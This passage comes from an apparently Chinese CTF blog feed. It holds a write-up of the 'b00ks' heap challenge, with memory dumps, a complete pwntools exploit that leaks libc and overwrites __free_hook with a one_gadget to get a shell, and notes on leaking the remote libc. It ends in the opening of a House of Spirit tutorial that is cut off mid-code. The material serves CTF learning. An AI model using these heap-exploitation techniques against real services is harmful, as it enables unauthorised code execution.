operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>book2<span class="token number">0x555555757560</span><span class="token operator">:</span>    <span class="token number">0x0000000000000002</span>    <span class="token number">0x00007ffff7fb9010</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>mmap返回地址<span class="token number">0x555555757570</span><span class="token operator">:</span>    <span class="token number">0x00007ffff7f97010</span>    <span class="token number">0x0000000000021000</span>  <span class="token number">0x555555757580</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020a81</span>vmmap    <span class="token number">0x555555757000</span>     <span class="token number">0x555555778000</span> rw<span class="token operator">-</span>p    <span class="token number">21000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>    <span class="token number">0x7ffff7a0d000</span>     <span class="token number">0x7ffff7bcd000</span> r<span class="token operator">-</span>xp   1c0000 <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.23</span><span class="token punctuation">.</span>so   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>一般第一个是我们要用来计算的    <span class="token number">0x7ffff7bcd000</span>     <span class="token number">0x7ffff7dcd000</span> <span class="token operator">--</span><span class="token operator">-</span>p   <span class="token number">200000</span> 1c0000 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.23</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dcd000</span>     <span class="token number">0x7ffff7dd1000</span> r<span class="token operator">--</span>p     <span class="token number">4000</span> 1c0000 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.23</span><span class="token punctuation">.</span>so    <span class="token number">0x7ffff7dd1000</span>     <span class="token number">0x7ffff7dd3000</span> rw<span class="token operator">-</span>p     <span class="token number">2000</span> 1c4000 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.23</span><span class="token punctuation">.</span>so</code></pre><p>0x00007ffff7fb9010   -0x7ffff7a0d000     ==0x5ac010 mmap 分配的内存与 libc 之前存在固定的偏移因此可以推算出 libc 的基地址。</p><p>获得libc地址后就可以将onegadget写入_free_hook中，然后执行delet即可触发哦呢gadget<br><strong>__free_hook __malloc_hook都存放着NULL如果里面放了地址，就会转到该地址进行执行</strong></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepcontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">author</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Enter author name: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>name_size<span class="token punctuation">,</span>name<span class="token punctuation">,</span>size<span class="token punctuation">,</span>descrip<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Enter book name size: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>name_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'nter book name (Max 32 chars): '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Enter book description size: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Enter book description: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>descrip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delet</span><span class="token punctuation">(</span>ID<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Enter the book id you want to delete: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>ID<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>ID<span class="token punctuation">,</span>descrip<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Enter the book id you want to edit: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>ID<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Enter new book description: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>descrip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#    gdb.attach(sh)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_author</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Enter author name: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./b00ks'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('node3.buuoj.cn',25412)</span>author<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'BBBBBBBB'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#0xd0 == 208</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Author: '</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>ptr2_struck_book1 <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'ptr2_struck===>'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ptr2_struck_book1<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x21000</span><span class="token punctuation">,</span><span class="token string">'vmmap1'</span><span class="token punctuation">,</span><span class="token number">0x21000</span><span class="token punctuation">,</span><span class="token string">'vmmap2'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#create(0x21000,'/bin/sh',0x21000,'vmmap2')</span>fake_chunk <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ptr2_struck_book1<span class="token operator">+</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ptr2_struck_book1<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xffff</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>change_author<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name: '</span><span class="token punctuation">)</span>vmmap1_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"vmmap1_addr====>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>vmmap1_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>vmmap_off_libc <span class="token operator">=</span> <span class="token number">0x5b1010</span>libc_addr <span class="token operator">=</span> vmmap1_addr <span class="token operator">-</span> vmmap_off_libc<span class="token keyword">print</span> <span class="token string">"libc_addr====>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_addrfree_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_addr   one_gadget <span class="token operator">=</span> libc_addr <span class="token operator">+</span> <span class="token number">0x4527a</span>  <span class="token comment" spellcheck="true">#system_addr = libc.symbols['system'] + libc_addr</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>delet<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>同时也可以用system来获取shell<br>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ cat flag<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x9</span> bytes<span class="token operator">:</span>    <span class="token string">'cat flag\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x25</span> bytes<span class="token operator">:</span>    <span class="token string">'cat: flag: No such file or directory\n'</span>cat<span class="token operator">:</span> flag<span class="token operator">:</span> No such file or directory$  </code></pre><h3 id="待完善"><a href="#待完善" class="headerlink" title="待完善"></a>待完善</h3><p>上面都是针对本地进行攻击，我在做BUU上面的这个题死活打不通。<br>关键点：</p><ul><li>在本地可以通过gdb调试获得mmap和libc加载地址的固定偏移，但是远程怎么弄？<ul><li>回到add源代码，可以发现如果size=-1就直接进行free操作：<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> ptr2_name_chunk <span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">// free ptr2_name_chunk</span>                                          <span class="token comment" spellcheck="true">//      ptr2_descrip_chunk</span>                                          <span class="token comment" spellcheck="true">//      ptr2_chunk</span><span class="token function">free</span><span class="token punctuation">(</span>ptr2_name_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> ptr2_descrip_chunk <span class="token punctuation">)</span><span class="token function">free</span><span class="token punctuation">(</span>ptr2_descrip_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> ptr2_chunk <span class="token punctuation">)</span><span class="token function">free</span><span class="token punctuation">(</span>ptr2_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span></code></pre></li><li>这样程序会报错并且回显出当时的段数据：</li></ul></li></ul><pre class=" language-java"><code class="language-java">matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>how2heap<span class="token operator">/</span>wiki_heap<span class="token operator">/</span>off by one$ nc node3<span class="token punctuation">.</span>buuoj<span class="token punctuation">.</span>cn <span class="token number">29661</span>Welcome to ASISCTF book libraryEnter author name<span class="token operator">:</span> asda<span class="token number">1</span><span class="token punctuation">.</span> Create a book<span class="token number">2</span><span class="token punctuation">.</span> Delete a book<span class="token number">3</span><span class="token punctuation">.</span> Edit a book<span class="token number">4</span><span class="token punctuation">.</span> Print book detail<span class="token number">5</span><span class="token punctuation">.</span> Change current author name<span class="token number">6</span><span class="token punctuation">.</span> Exit</code></pre><pre class=" language-java"><code class="language-java">\<span class="token operator">></span> <span class="token number">1</span>Enter book name size<span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span>Malformed size\<span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span> Error in `<span class="token punctuation">.</span>/pwn<span class="token operator">/</span>pwn'<span class="token operator">:</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> invalid size<span class="token operator">:</span> <span class="token number">0x00007ffc687e9110</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> Backtrace<span class="token operator">:</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">6</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token number">0x777e5</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x7faaa4e9e7e5</span><span class="token punctuation">]</span><span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">6</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token number">0x8037a</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x7faaa4ea737a</span><span class="token punctuation">]</span><span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">6</span><span class="token punctuation">(</span>cfree<span class="token operator">+</span><span class="token number">0x4c</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x7faaa4eab53c</span><span class="token punctuation">]</span><span class="token punctuation">.</span>/pwn<span class="token operator">/</span><span class="token function">pwn</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token number">0x11a2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x55c6e35c21a2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>/pwn<span class="token operator">/</span><span class="token function">pwn</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token number">0x1284</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x55c6e35c2284</span><span class="token punctuation">]</span><span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token function">6</span><span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">0xf0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x7faaa4e47830</span><span class="token punctuation">]</span><span class="token punctuation">.</span>/pwn<span class="token operator">/</span><span class="token function">pwn</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token number">0x909</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x55c6e35c1909</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> Memory map<span class="token operator">:</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>55c6e35c1000<span class="token operator">-</span>55c6e35c3000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1190167747</span>                 <span class="token operator">/</span>pwn<span class="token operator">/</span>pwn55c6e37c2000<span class="token operator">-</span>55c6e37c3000 r<span class="token operator">--</span>p <span class="token number">00001000</span> fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1190167747</span>                 <span class="token operator">/</span>pwn<span class="token operator">/</span>pwn55c6e37c3000<span class="token operator">-</span>55c6e37c4000 rw<span class="token operator">-</span>p <span class="token number">00002000</span> fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1190167747</span>                 <span class="token operator">/</span>pwn<span class="token operator">/</span>pwn55c6e40ae000<span class="token operator">-</span>55c6e40d0000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>7faaa0000000<span class="token operator">-</span>7faaa0021000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7faaa0021000<span class="token operator">-</span>7faaa4000000 <span class="token operator">--</span><span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7faaa4c11000<span class="token operator">-</span>7faaa4c27000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1171288770</span>                 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libgcc_s<span class="token punctuation">.</span>so<span class="token number">.1</span>7faaa4c27000<span class="token operator">-</span>7faaa4e26000 <span class="token operator">--</span><span class="token operator">-</span>p <span class="token number">00016000</span> fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1171288770</span>                 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libgcc_s<span class="token punctuation">.</span>so<span class="token number">.1</span>7faaa4e26000<span class="token operator">-</span>7faaa4e27000 rw<span class="token operator">-</span>p <span class="token number">00015000</span> fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1171288770</span>                 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libgcc_s<span class="token punctuation">.</span>so<span class="token number">.1</span>7faaa4e27000<span class="token operator">-</span>7faaa4fe7000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1171288750</span>                 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.23</span><span class="token punctuation">.</span>so  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>通过比对本地报错信息可以知道这里是对方的7faaa4fe7000<span class="token operator">-</span>7faaa51e7000 <span class="token operator">--</span><span class="token operator">-</span>p 001c0000 fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1171288750</span>                 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.23</span><span class="token punctuation">.</span>so                    libc加载地址。7faaa51e7000<span class="token operator">-</span>7faaa51eb000 r<span class="token operator">--</span>p 001c0000 fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1171288750</span>                 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.23</span><span class="token punctuation">.</span>so7faaa51eb000<span class="token operator">-</span>7faaa51ed000 rw<span class="token operator">-</span>p 001c4000 fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1171288750</span>                 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.23</span><span class="token punctuation">.</span>so7faaa51ed000<span class="token operator">-</span>7faaa51f1000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7faaa51f1000<span class="token operator">-</span>7faaa5217000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1171288730</span>                 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.23</span><span class="token punctuation">.</span>so7faaa540f000<span class="token operator">-</span>7faaa5412000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7faaa5415000<span class="token operator">-</span>7faaa5416000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7faaa5416000<span class="token operator">-</span>7faaa5417000 r<span class="token operator">--</span>p <span class="token number">00025000</span> fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1171288730</span>                 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.23</span><span class="token punctuation">.</span>so7faaa5417000<span class="token operator">-</span>7faaa5418000 rw<span class="token operator">-</span>p <span class="token number">00026000</span> fc<span class="token operator">:</span><span class="token number">11</span> <span class="token number">1171288730</span>                 <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.23</span><span class="token punctuation">.</span>so7faaa5418000<span class="token operator">-</span>7faaa5419000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7ffc687c9000<span class="token operator">-</span>7ffc687ea000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>7ffc687f6000<span class="token operator">-</span>7ffc687f9000 r<span class="token operator">--</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>7ffc687f9000<span class="token operator">-</span>7ffc687fb000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>ffffffffff600000<span class="token operator">-</span>ffffffffff601000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                  <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span>timeout<span class="token operator">:</span> the monitored command dumped core</code></pre><p>所以我的脚本里泄露完vmmap地址后有这样一行：<strong>#create(-1,’a’,-1,’a’)</strong><br>根据报错信息就可以退出对方的libc地址</p><ul><li>虽然我成功解决了这个问题，但是还是打不通o(≧口≦)o。本地一下子就通了，我是1604的环境，那我觉得应该就是libc版本的问题了，在此求大佬( •̀ ω •́ )✧</li></ul><h2 id="MASS"><a href="#MASS" class="headerlink" title="MASS"></a>MASS</h2><p>为了做这个题我必须再我的1604装一个onegadget，根据网上的步骤能成功安装，却不能用，报错忘记截屏了。网上似乎没有人遇到这种情况，最后自己对比了以下：/var/lib/gems/2.3.0/gems/elftools-1.1.3/elf_file.rb文件<br>第59行改为：note.desc.unpack(‘H*‘).first<br>因为我的一个虚拟机的onegadget能用，根据报错找到了这里  </p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House Of Spirit(HOS)</title>
      <link href="/2020/09/19/house-of-spirit-hos/"/>
      <url>/2020/09/19/house-of-spirit-hos/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>House of Spirit（下面称为hos）算是一个组合型漏洞的利用，是变量覆盖和堆管理机制的组合利用，<strong>关键在于能够覆盖一个堆指针变量，使其指向可控的区域</strong>，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fast bin里面，最后再分配出来的时候，就有可能改写我们目标区域。<br><img src="https://s1.ax1x.com/2020/09/19/w5HG5D.png" alt=""><br>分别在两个可控区构造chunk数据，来绕过free函数检查，使其以为这整个数据段都是used chunk</p><h2 id="Free函数检查机制"><a href="#Free函数检查机制" class="headerlink" title="Free函数检查机制"></a>Free函数检查机制</h2><p><strong>free -&gt; __libc_free -&gt; _int_free</strong><br>__libc_free源码如下：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span><span class="token function">__libc_free</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>mem<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//通用类型的指针，指向 memory 区域  用户数据段</span><span class="token punctuation">{</span>  mstate ar_ptr<span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//指向 malloc_state 结构体的指针</span>  mchunkptr p<span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">//mchunkptr 为指向 malloc_chunk 结构体的指针           </span><span class="token comment" spellcheck="true">/* chunk corresponding to mem */</span>  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>hook<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>    <span class="token operator">=</span> <span class="token function">atomic_forced_read</span> <span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//定义一个 hook 的函数指针，将 __free_hook 函数指针赋值给他。</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>hook <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token 